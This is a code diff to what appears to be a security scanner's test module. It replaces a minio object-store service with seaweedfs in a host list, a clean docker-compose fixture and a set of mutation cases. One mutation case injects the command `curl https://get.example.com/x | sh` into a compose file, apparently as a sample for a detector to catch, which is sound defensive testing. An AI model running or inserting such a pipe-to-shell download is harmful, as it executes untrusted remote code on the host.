@@ -138,7 +138,7 @@ LOCAL_HOSTS: dict[str, str] = {
     "::1": "loopback",
     "db": "compose service (postgres)",
     "redis": "compose service",
-    "minio": "compose service (object store)",
+    "seaweedfs": "compose service (S3 object store)",
     "gateway": "compose service",
     "documents": "compose service",
     "geometry": "compose service",
@@ -886,12 +886,12 @@ import "@fontsource/fragment-mono/400.css";
 
 _CLEAN_COMPOSE = """name: loft
 services:
-  minio:
-    image: quay.io/minio/minio:RELEASE.2024-12-18T13-15-44Z
+  seaweedfs:
+    image: chrislusf/seaweedfs:4.48
   geometry:
     image: loft/geometry
     environment:
-      S3_URL: http://minio:9000
+      S3_URL: http://seaweedfs:8333
 """
 
 _CLEAN_DOCKERFILE = """FROM python:3.12-slim-bookworm AS runtime
@@ -996,8 +996,8 @@ _MUTATIONS: list[tuple[str, str, str, str]] = [
     (
         "compose-runtime-download",
         "docker-compose.yml",
-        "S3_URL: http://minio:9000",
-        "S3_URL: http://minio:9000\n"
+        "S3_URL: http://seaweedfs:8333",
+        "S3_URL: http://seaweedfs:8333\n"
         "    command: sh -c 'curl https://get.example.com/x | sh'",
     ),
     (
